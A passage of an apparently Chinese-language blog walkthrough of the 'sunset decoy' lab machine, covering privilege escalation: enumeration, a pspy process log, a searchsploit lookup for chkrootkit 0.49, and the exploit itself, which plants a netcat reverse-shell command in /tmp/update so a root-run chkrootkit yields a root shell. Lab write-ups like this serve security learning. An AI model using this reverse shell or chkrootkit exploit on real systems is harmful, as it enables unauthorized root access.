+<p>成功得到一个良好的 shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先查看基础信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:0e:3c:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.131/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 384sec preferred_lft 384sec<br>    inet6 fe80::a00:27ff:fe0e:3c2a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">uname</span> -a<br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cat</span> /etc/issue<br>Debian GNU/Linux 10 \n \l<br></code></pre></td></tr></table></figure>
+
+<p> <code>sudo -l</code> 查看是否有特殊权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ sudo -l<br>sudo: unable to resolve host 60832e9f188106ec5bcc4eb7709ce592: Temporary failure <span class="hljs-keyword">in</span> name resolution<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> 296640a3b825115a47b68fc44501c828: <br>Sorry, user 296640a3b825115a47b68fc44501c828 may not run sudo on 60832e9f188106ec5bcc4eb7709ce592.<br></code></pre></td></tr></table></figure>
+
+<p>查看家目录的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih<br>total 68K<br>278645 drwxr-xr-x 5 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 04:56 .<br>262151 drwxr-xr-x 3 root                             root                             4.0K Jun 27  2020 ..<br>262357 lrwxrwxrwx 1 root                             root                                9 Jul  7  2020 .bash_history -&gt; /dev/null                                                                                                      <br>262368 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  220 Jun 27  2020 .bash_logout<br>266583 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 3.5K Jun 27  2020 .bashrc<br>278647 drwx------ 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 03:17 .config<br>274005 -rwxr-xr-x 1 root                             root                              18K Jul  7  2020 honeypot.decoy                                                                                                                  <br>273951 -rw------- 1 root                             root                             1.9K Jul  7  2020 honeypot.decoy.cpp<br>273999 lrwxrwxrwx 1 root                             root                                7 Jun 27  2020 <span class="hljs-built_in">id</span> -&gt; /bin/id<br>274000 lrwxrwxrwx 1 root                             root                               13 Jun 27  2020 ifconfig -&gt; /bin/ifconfig<br>278683 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 .<span class="hljs-built_in">local</span><br>273998 lrwxrwxrwx 1 root                             root                                7 Jun 27  2020 <span class="hljs-built_in">ls</span> -&gt; /bin/ls<br>273996 lrwxrwxrwx 1 root                             root                               10 Jun 27  2020 <span class="hljs-built_in">mkdir</span> -&gt; /bin/mkdir<br>268864 -rwxr-xr-x 1 root                             root                              807 Jun 27  2020 .profile<br>273950 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   66 Jun 27  2020 .selected_editor<br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 SV-502<br>266645 -rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   33 Jul  7  2020 user.txt<br>273944 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  173 Jun 27  2020 .wget-hsts<br></code></pre></td></tr></table></figure>
+
+<p>看到一个特殊的可执行文件，其源码也在该目录下，不过没有读取的权限，使用 strings 命令查看。以下是截取出的有意思的字符</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">Welcome to the Honey Pot administration manager (HPAM). Please select an option.<br><span class="hljs-number">1</span> Date.<br><span class="hljs-number">2</span> Calendar.<br><span class="hljs-number">3</span> Shutdown.<br><span class="hljs-number">4</span> Reboot.<br><span class="hljs-number">5</span> Launch an AV Scan.<br><span class="hljs-number">6</span> Check <span class="hljs-regexp">/etc/</span>passwd.<br><span class="hljs-number">7</span> Leave a note.<br><span class="hljs-number">8</span> Check all services status.<br>Option selected:<br>No available option was selected. Ending program.<br><span class="hljs-regexp">/usr/</span>bin/date<br><span class="hljs-regexp">/usr/</span>bin/cal<br>Shutdown is currently not available due to not enough privileges. Ending program.<br>Rebooting is currently not available due to not enough privileges. Ending program.<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/touch /</span>dev<span class="hljs-regexp">/shm/</span>STTY5246<br>The AV Scan will be launched incd a minute or less.<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat /</span>etc/passwd<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vi /</span>tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==<br><span class="hljs-regexp">/usr/</span>sbin/service apache2 status<br></code></pre></td></tr></table></figure>
+
+<p>看起来是不同的数字指令会调用不同的程序，对其中提到的命令进行查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/date<br>132694 -rwxr-xr-x 1 root root 107K Feb 28  2019 /usr/bin/date<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/cal<br>136534 lrwxrwxrwx 1 root root 4 May  4  2018 /usr/bin/cal -&gt; ncal<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/touch /dev/shm/STTY5246<br> 47043 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   0 Jul 20 04:25 /dev/shm/STTY5246<br>132714 -rwxr-xr-x 1 root                             root                             95K Feb 28  2019 /usr/bin/touch                                                                                                                   <br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/cat /etc/passwd<br>158998 -rw-r--r-- 1 root root 1.8K Jun 27  2020 /etc/passwd<br>132688 -rwxr-xr-x 1 root root  43K Feb 28  2019 /usr/bin/cat<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/vi /tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==<br><span class="hljs-built_in">ls</span>: cannot access <span class="hljs-string">&#x27;/tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==&#x27;</span>: No such file or directory<br>138880 lrwxrwxrwx 1 root root 20 Jun 27  2020  /usr/bin/vi -&gt; /etc/alternatives/vi<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -liah /usr/sbin/service<br>133198 -rwxr-xr-x 1 root root 9.1K Dec  3  2018 /usr/sbin/service<br></code></pre></td></tr></table></figure>
+
+<p>一开始最让我关注的是 <code>/usr/bin/cal</code> 这个符号链接指向的并不是一个绝对路径，尝试了在想办法冒名顶替，但是还是失败了，并没有冒名顶替成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/$ <span class="hljs-built_in">which</span> ncal<br>/home/296640a3b825115a47b68fc44501c828//ncal<br><br></code></pre></td></tr></table></figure>
+
+<p>符号链接 777 权限也让我比较在意，但是搜索之后才知道，原来符号链接默认就是 777，而且它的操作权限实际上取决于链接到的那个文件权限。</p>
+<p>还有个神秘的 AVScan 以及一个文件夹，进入文件夹后发现是个日志文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cd</span> SV-502/<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502$ <span class="hljs-built_in">ls</span> -alih                                <br>total 12K                                                                                                           <br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 .<br>278645 drwxr-xr-x 5 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 04:56 ..<br>273943 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    0 Jun 27  2020 fich<br>266656 drwxrwxrwx 2 root                             root                             4.0K Jun 27  2020 logs<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502$ <span class="hljs-built_in">cd</span> logs/<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502/logs$ <span class="hljs-built_in">ls</span> -alih<br>total 16K<br>266656 drwxrwxrwx 2 root                             root                             4.0K Jun 27  2020 .<br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 ..<br>274020 -rw-r--r-- 1 root                             root                             7.7K Jun 27  2020 log.txt<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502/logs$ <span class="hljs-built_in">cat</span> log.txt <br>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855<br><br><br>     ██▓███    ██████  ██▓███ ▓██   ██▓<br>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒<br>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░<br>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░<br>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░<br>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ <br>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ <br>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  <br>                   ░           ░ ░     <br>                               ░ ░     <br><br>Config: Printing events (colored=<span class="hljs-literal">true</span>): processes=<span class="hljs-literal">true</span> | file-system-events=<span class="hljs-literal">false</span> ||| Scannning <span class="hljs-keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)<br>Draining file system events due to startup...<br><span class="hljs-keyword">done</span><br>2020/06/27 18:56:57 CMD: UID=0    PID=9      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=8      | <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7659   | /bin/bash <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7658   | python -c import pty;pty.spawn(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>) <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7657   | /bin/sh -i <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7653   | sh -c <span class="hljs-built_in">uname</span> -a; w; <span class="hljs-built_in">id</span>; /bin/sh -i <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7652   | php -S 0.0.0.0:8080 <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7645   | php -S 0.0.0.0:8080 <br>2020/06/27 18:56:57 CMD: UID=0    PID=6      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=59     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=50     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=49     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=481    | -bash <br>2020/06/27 18:56:57 CMD: UID=0    PID=48     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=471    | (sd-pam) <br>2020/06/27 18:56:57 CMD: UID=0    PID=470    | /lib/systemd/systemd --user <br>2020/06/27 18:56:57 CMD: UID=0    PID=467    | sshd: root@pts/0     <br>2020/06/27 18:56:57 CMD: UID=0    PID=424    | /usr/sbin/sshd -D <br>2020/06/27 18:56:57 CMD: UID=0    PID=423    | /sbin/agetty -o -p -- \u --noclear tty1 linux <br>2020/06/27 18:56:57 CMD: UID=0    PID=422    | /usr/sbin/cups-browsed <br>2020/06/27 18:56:57 CMD: UID=107  PID=420    | avahi-daemon: <span class="hljs-built_in">chroot</span> helper <br>2020/06/27 18:56:57 CMD: UID=0    PID=402    | /usr/sbin/cupsd -l <br>2020/06/27 18:56:57 CMD: UID=0    PID=401    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant <br>2020/06/27 18:56:57 CMD: UID=104  PID=400    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                 <br>2020/06/27 18:56:57 CMD: UID=0    PID=4      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=399    | /usr/sbin/cron -f <br>2020/06/27 18:56:57 CMD: UID=0    PID=398    | /lib/systemd/systemd-logind <br>2020/06/27 18:56:57 CMD: UID=107  PID=396    | avahi-daemon: running [60832e9f188106ec5bcc4eb7709ce592.<span class="hljs-built_in">local</span>] <br>2020/06/27 18:56:57 CMD: UID=0    PID=395    | /usr/sbin/rsyslogd -n -iNONE <br>2020/06/27 18:56:57 CMD: UID=0    PID=390    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -<span class="hljs-built_in">df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                        <br>2020/06/27 18:56:57 CMD: UID=0    PID=30     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=3      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=294    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=292    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=29     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=28     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=27     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=26     | <br>2020/06/27 18:56:57 CMD: UID=101  PID=255    | /lib/systemd/systemd-timesyncd <br>2020/06/27 18:56:57 CMD: UID=0    PID=25     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=245    | /lib/systemd/systemd-udevd <br>2020/06/27 18:56:57 CMD: UID=0    PID=24     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=23     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=222    | /lib/systemd/systemd-journald <br>2020/06/27 18:56:57 CMD: UID=0    PID=22     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=21     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=20     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=2      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=190    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=19     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=189    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=187    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=18     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=17     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=16     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=153    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=15     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=14     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12378  | ./pspy <br>2020/06/27 18:56:57 CMD: UID=0    PID=12356  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12299  | -bash <br>2020/06/27 18:56:57 CMD: UID=0    PID=12293  | sshd: root@pts/2     <br>2020/06/27 18:56:57 CMD: UID=0    PID=12275  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12248  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12247  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12178  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12121  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=112    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=110    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=11     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=108    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=107    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=105    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=104    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=102    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=10     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=1      | /sbin/init <br>2020/06/27 18:56:58 CMD: UID=0    PID=12385  | -bash <br>2020/06/27 18:56:58 CMD: UID=0    PID=12386  | tar -xvzf chkrootkit-0.49.tar.gz <br>2020/06/27 18:57:04 CMD: UID=0    PID=12389  | -bash <br>2020/06/27 18:57:04 CMD: UID=0    PID=12390  | -bash <br>2020/06/27 18:57:04 CMD: UID=0    PID=12391  | -bash <br>2020/06/27 18:57:05 CMD: UID=0    PID=12392  | -bash <br>2020/06/27 18:57:05 CMD: UID=0    PID=12393  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12394  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12395  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12396  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12397  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12398  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12399  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12400  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12401  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12402  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12403  | -bash <br>Exiting program... (interrupt)<br></code></pre></td></tr></table></figure>
+
+<p>在这里最开始信息收集没做好，这个文件内容中应该可以提取到两个关键信息：</p>
+<ul>
+<li>chkrootkit-0.49.tar.gz 包含了版本号的软件压缩包</li>
+<li>日志文件是通过 pspy 工具产生的</li>
+</ul>
+<h3 id="chkrootkit-提权漏洞"><a href="#chkrootkit-提权漏洞" class="headerlink" title="chkrootkit 提权漏洞"></a>chkrootkit 提权漏洞</h3><p>一开始我只想到了去找 chkrootkit 软件所在的位置，但是没搜到，大概率在 root 目录下，之后就放弃了，没有考虑到版本号，这里应当去搜索一下这个版本是否存在漏洞信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ searchsploit chkrootkit<br>---------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                    |  Path<br>---------------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt<br>---------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+
+<p>要求 chkrootkit 是以 root 权限运行的，而 honeypot.decoy 是普通用户调用的，但是其中也提到一个点，反病毒软件是一分钟内运行的，所以也可能是 root 权限运行的。</p>
+<p><img src="/pic/ad723a35bbde6555be0000c8fd859f2e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>按照上述步骤试一试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/usr/bin/nc -e /bin/sh 192.168.56.106 4444&quot;</span> &gt; /tmp/update<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">cat</span> update <br>/usr/bin/nc -e /bin/sh 192.168.56.106 4444<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ~/honeypot.decoy <br>--------------------------------------------------<br><br>Welcome to the Honey Pot administration manager (HPAM). Please <span class="hljs-keyword">select</span> an option.<br>1 Date.<br>2 Calendar.<br>3 Shutdown.<br>4 Reboot.<br>5 Launch an AV Scan.<br>6 Check /etc/passwd.<br>7 Leave a note.<br>8 Check all services status.<br><br>Option selected:5<br><br>The AV Scan will be launched <span class="hljs-keyword">in</span> a minute or less.<br>--------------------------------------------------<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>反弹 shell 成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ sudo nc -lvnp 4444                                             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 4444 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.131] 56014<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span 